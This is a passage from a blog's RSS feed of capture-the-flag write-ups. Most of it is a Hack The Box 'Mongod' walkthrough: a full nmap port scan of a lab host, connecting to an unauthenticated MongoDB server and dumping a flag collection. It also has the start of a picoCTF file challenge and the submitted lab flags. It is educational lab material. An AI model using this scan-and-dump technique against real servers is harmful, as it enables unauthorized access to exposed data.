</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span><span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span><span style="color:#89dceb;font-weight:bold">[</span>10.10.14.28<span style="color:#89dceb;font-weight:bold">]</span><span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-wv2b0ymwtt<span style="color:#89dceb;font-weight:bold">]</span><span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span> <span style="color:#89dceb;font-weight:bold">[</span><span style="color:#89dceb;font-weight:bold">]</span>$ cat flag.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">8</span><span>72eaf5344ebb84908ae543a719830519</span></span></code></pre></div>
<br>
<p><img src="image-1.png#center" alt="alt text"></p>
]]></content:encoded>
    </item>
    <item>
      <title>[HTB] Mongod</title>
      <link>http://localhost:1313/htb-mongod/</link>
      <pubDate>Wed, 10 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/htb-mongod/</guid>
      <description>it&amp;rsquo;s been quite a while since I tackled any challenges on Hack The Box. My original plan was to strengthen my fundamentals on TryHackMe and then come back to Hack The Box. But now I&amp;rsquo;m thinking, why not do both at the same time? I can learn by diving in and trying things out as I go.
How many TCP ports are open on the machine? 2 1[us-starting-point-vip-1-dhcp][10.10.14.28][leewookb@htb-l3lgefdeyz][~] 2 []$ sudo nmap -sC -sV 10.</description>
      <content:encoded><![CDATA[<p>it&rsquo;s been quite a while since I tackled any challenges on Hack The Box. My original plan was to strengthen my fundamentals on TryHackMe and then come back to Hack The Box. But now I&rsquo;m thinking, why not do both at the same time? I can learn by diving in and trying things out as I go.</p>
<div style="text-align: center"><img src="./just_do_it.gif"></div>
<hr>
<h4 id="how-many-tcp-ports-are-open-on-the-machine">How many TCP ports are open on the machine?</h4>






<pre tabindex="0"><code>2</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span><span style="color:#89dceb;font-weight:bold">[</span>10.10.14.28<span style="color:#89dceb;font-weight:bold">]</span><span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-l3lgefdeyz<span style="color:#89dceb;font-weight:bold">]</span><span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span> <span style="color:#89dceb;font-weight:bold">[</span><span style="color:#89dceb;font-weight:bold">]</span>$ sudo nmap -sC -sV 10.129.228.30 -p-
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Starting Nmap 7.94SVN <span style="color:#89dceb;font-weight:bold">(</span> https://nmap.org <span style="color:#89dceb;font-weight:bold">)</span> at 2024-07-10 23:00 CDT
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Nmap scan report <span style="color:#cba6f7">for</span> 10.129.228.30
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Host is up <span style="color:#89dceb;font-weight:bold">(</span>0.0087s latency<span style="color:#89dceb;font-weight:bold">)</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Not shown: <span style="color:#fab387">65533</span> closed tcp ports <span style="color:#89dceb;font-weight:bold">(</span>reset<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>PORT      STATE SERVICE VERSION
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span style="color:#89dceb;font-weight:bold">(</span>Ubuntu Linux; protocol 2.0<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>| ssh-hostkey:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>|   <span style="color:#fab387">3072</span> 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae <span style="color:#89dceb;font-weight:bold">(</span>RSA<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>|   <span style="color:#fab387">256</span> b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f <span style="color:#89dceb;font-weight:bold">(</span>ECDSA<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>|_  <span style="color:#fab387">256</span> 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb <span style="color:#89dceb;font-weight:bold">(</span>ED25519<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>27017/tcp open  mongodb MongoDB 3.6.8 3.6.8</span></span></code></pre></div>
<br>
<h4 id="which-service-is-running-on-port-27017-of-the-remote-host">Which service is running on port 27017 of the remote host?</h4>






<pre tabindex="0"><code>MongoDB 3.6.8</code></pre>
<p><code>27017/tcp open  mongodb MongoDB 3.6.8 3.6.8</code></p>
<br>
<h4 id="what-type-of-database-is-mongodb-choose-sql-or-nosql">What type of database is MongoDB? (Choose: SQL or NoSQL)</h4>






<pre tabindex="0"><code>NoSQL</code></pre>
<p>MongoDB is a NoSQL database designed for scalability, flexibility, and ease of development. MongoDB stores data in flexible, JSON-like documents, meaning fields can vary from document to document and data structure can be changed over time. This differs from traditional relational databases that use tables and rows to store data.</p>
<br>
<h4 id="what-is-the-command-name-for-the-mongo-shell-that-is-installed-with-the-mongodb-clients-package">What is the command name for the Mongo shell that is installed with the mongodb-clients package?</h4>






<pre tabindex="0"><code>mongo</code></pre>
<br>
<h4 id="what-is-the-command-used-for-listing-all-the-databases-present-on-the-mongodb-server-no-need-to-include-a-trailing-">What is the command used for listing all the databases present on the MongoDB server? (No need to include a trailing ;)</h4>






<pre tabindex="0"><code>show dbs</code></pre>
<p>In order to connect to the remote MongoDB server we need to install the <code>mongodb</code> utility by running the following command:
<code>curl -O https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-3.4.7.tgz</code></p>
<p>then extract the contents of the tar archive file using the <code>tar</code> utility
<code>tar xvf mongodb-linux-x86_64-3.4.7.tgz</code></p>
<p>Then navigate to the <code>bin</code> folder to execute the mongo binary and connect to the MongoDB server
<code>./mongo mongodb://10.129.228.30:27017</code></p>
<p>We are connected to the mongoDB server.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span><span style="color:#89dceb;font-weight:bold">[</span>10.10.14.28<span style="color:#89dceb;font-weight:bold">]</span><span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-l3lgefdeyz<span style="color:#89dceb;font-weight:bold">]</span><span style="color:#89dceb;font-weight:bold">[</span>~/Downloads/mongodb-linux-x86_64-3.4.7/bin<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span> <span style="color:#89dceb;font-weight:bold">[</span><span style="color:#89dceb;font-weight:bold">]</span>$ ./mongo mongodb://10.129.228.30:27017
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>MongoDB shell version v3.4.7
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>connecting to: mongodb://10.129.228.30:27017
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>MongoDB server version: 3.6.8
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>WARNING: shell and server versions <span style="color:#cba6f7">do</span> not match
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>Welcome to the MongoDB shell.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>For interactive help, <span style="color:#89dceb">type</span> <span style="color:#a6e3a1">&#34;help&#34;</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>For more comprehensive documentation, see
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>	http://docs.mongodb.org/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>Questions? Try the support group
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>	http://groups.google.com/group/mongodb-user
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>Server has startup warnings:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>2024-07-11T03:57:47.294+0000 I STORAGE  <span style="color:#89dceb;font-weight:bold">[</span>initandlisten<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>2024-07-11T03:57:47.294+0000 I STORAGE  <span style="color:#89dceb;font-weight:bold">[</span>initandlisten<span style="color:#89dceb;font-weight:bold">]</span> ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>2024-07-11T03:57:47.294+0000 I STORAGE  <span style="color:#89dceb;font-weight:bold">[</span>initandlisten<span style="color:#89dceb;font-weight:bold">]</span> **          See http://dochub.mongodb.org/core/prodnotes-filesystem
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>2024-07-11T03:57:49.369+0000 I CONTROL  <span style="color:#89dceb;font-weight:bold">[</span>initandlisten<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>2024-07-11T03:57:49.369+0000 I CONTROL  <span style="color:#89dceb;font-weight:bold">[</span>initandlisten<span style="color:#89dceb;font-weight:bold">]</span> ** WARNING: Access control is not enabled <span style="color:#cba6f7">for</span> the database.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>2024-07-11T03:57:49.369+0000 I CONTROL  <span style="color:#89dceb;font-weight:bold">[</span>initandlisten<span style="color:#89dceb;font-weight:bold">]</span> **          Read and write access to data and configuration is unrestricted.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>2024-07-11T03:57:49.369+0000 I CONTROL  <span style="color:#89dceb;font-weight:bold">[</span>initandlisten<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>&gt;</span></span></code></pre></div>
<br>
<p>the <code>help</code> command shows <code>show dbs</code> command lists all the databases present on the server.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>&gt; <span style="color:#89dceb">help</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>	db.help<span style="color:#89dceb;font-weight:bold">()</span>                    <span style="color:#89dceb">help</span> on db methods
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>	db.mycoll.help<span style="color:#89dceb;font-weight:bold">()</span>             <span style="color:#89dceb">help</span> on collection methods
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>	sh.help<span style="color:#89dceb;font-weight:bold">()</span>                    sharding helpers
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>	rs.help<span style="color:#89dceb;font-weight:bold">()</span>                    replica <span style="color:#89dceb">set</span> helpers
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>	<span style="color:#89dceb">help</span> admin                   administrative <span style="color:#89dceb">help</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>	<span style="color:#89dceb">help</span> connect                 connecting to a db <span style="color:#89dceb">help</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>	<span style="color:#89dceb">help</span> keys                    key shortcuts
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>	<span style="color:#89dceb">help</span> misc                    misc things to know
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>	<span style="color:#89dceb">help</span> mr                      mapreduce
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>	show dbs                     show database names</span></span></code></pre></div>
<br>
<h4 id="what-is-the-command-used-for-listing-out-the-collections-in-a-database-no-need-to-include-a-trailing-">What is the command used for listing out the collections in a database? (No need to include a trailing ;)</h4>






<pre tabindex="0"><code>show collections</code></pre>
<br>
<h4 id="what-is-the-command-used-for-dumping-the-content-of-all-the-documents-within-the-collection-named-flag-in-a-format-that-is-easy-to-read">What is the command used for dumping the content of all the documents within the collection named flag in a format that is easy to read?</h4>






<pre tabindex="0"><code>db.flag.find().pretty()</code></pre>
<br>
<p><code>help</code> command
<img src="image-1.png#center" alt="alt text"></p>
<br>
<p><code>db.mycoll.help()</code> command
<img src="image-2.png#center" alt="alt text"></p>
<br>
<p><code>db.mycoll.find().help()</code> command
<img src="image-3.png#center" alt="alt text"></p>
<br>
<h4 id="submit-root-flag">submit root flag</h4>






<pre tabindex="0"><code>1b6e6fb359e7c40241b6d431427ba6ea</code></pre>
<br>
<p><code>show dbs</code> -&gt; <code>use sensitive_information</code> -&gt; <code>show collections</code> -&gt; <code>db.flag.find()</code></p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>&gt; show dbs
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>admin                  0.000GB
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>config                 0.000GB
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span><span style="color:#89dceb">local</span>                  0.000GB
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>sensitive_information  0.000GB
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>users                  0.000GB
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>&gt; use sensitive_information
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>switched to db sensitive_information
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>&gt; show collections
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>flag
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>&gt; db.flag.find<span style="color:#89dceb;font-weight:bold">()</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span><span style="color:#89dceb;font-weight:bold">{</span> <span style="color:#a6e3a1">&#34;_id&#34;</span> : ObjectId<span style="color:#89dceb;font-weight:bold">(</span><span style="color:#a6e3a1">&#34;630e3dbcb82540ebbd1748c5&#34;</span><span style="color:#89dceb;font-weight:bold">)</span>, <span style="color:#a6e3a1">&#34;flag&#34;</span> : <span style="color:#a6e3a1">&#34;1b6e6fb359e7c40241b6d431427ba6ea&#34;</span> <span style="color:#89dceb;font-weight:bold">}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>&gt;</span></span></code></pre></div>
<br>
<p><img src="image-4.png#center" alt="alt text"></p>
]]></content:encoded>
    </item>
    <item>
      <title>[picoCTF] CanYouSee</title>
      <link>http://localhost:1313/picoctf-canyousee/</link>
      <pubDate>Tue, 09 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/picoctf-canyousee/</guid>
      <description>This one from picoCTF was fairly easy, so I was unsure about uploading it. However, there was a part that I wasn&amp;rsquo;t familiar with, and I learned something new. So, why not?
Description How about some hide and seek?
As usual, I started by downloading the provided file to my local machine by using the wget command.
1(kalikali)-[~/Desktop/pico] 2$ wget https://artifacts.picoctf.net/c_titan/128/unknown.zip 3--2024-07-09 16:33:45-- https://artifacts.picoctf.net/c_titan/128/unknown.zip 4Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 54.230.253.65, 54.230.253.91, 54.230.253.20, .</description>
      <content:encoded><![CDATA[<p>This one from picoCTF was fairly easy, so I was unsure about uploading it. However, there was a part that I wasn&rsquo;t familiar with, and I learned something new. So, why not?</p>
<div style="text-align: center;"><img src="./giphy.gif"></div>
<hr>
<h3 id="description">Description</h3>
<p>How about some hide and seek?</p>
<hr>
<p>As usual, I started by downloading the provided file to my local machine by using the <code>wget</code> command.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop/pico<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>$ wget https://artifacts.picoctf.net/c_titan/128/unknown.zip
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>--2024-07-09 16:33:45--  https://artifacts.picoctf.net/c_titan/128/unknown.zip
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Resolving artifacts.picoctf.net <span style="color:#89dceb;font-weight:bold">(</span>artifacts.picoctf.net<span style="color:#89dceb;font-weight:bold">)</span>... 54.230.253.65, 54.230.253.91, 54.230.253.20, ...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Connecting to artifacts.picoctf.net <span style="color:#89dceb;font-weight:bold">(</span>artifacts.picoctf.net<span style="color:#89dceb;font-weight:bold">)</span>|54.230.253.65|:443... connected.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>HTTP request sent, awaiting response... <span style="color:#fab387">200</span> OK
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>Length: <span style="color:#fab387">2252108</span> <span style="color:#89dceb;font-weight:bold">(</span>2.1M<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>application/octet-stream<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>Saving to: unknown.zip
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>unknown.zip                            100%<span style="color:#89dceb;font-weight:bold">[============================================================================</span>&gt;<span style="color:#89dceb;font-weight:bold">]</span>   2.15M  11.2MB/s    in 0.2s
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>2024-07-09 16:33:47 <span style="color:#89dceb;font-weight:bold">(</span>11.2 MB/s<span style="color:#89dceb;font-weight:bold">)</span> - unknown.zip saved <span style="color:#89dceb;font-weight:bold">[</span>2252108/2252108<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop/pico<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>unknown.zip</span></span></code></pre></div>
<br>
<p>Unzipped the unknown.zip file.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop/pico<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>$ unzip unknown.zip
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>Archive:  unknown.zip
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>  inflating: ukn_reality.jpg
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop/pico<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span>$ ls
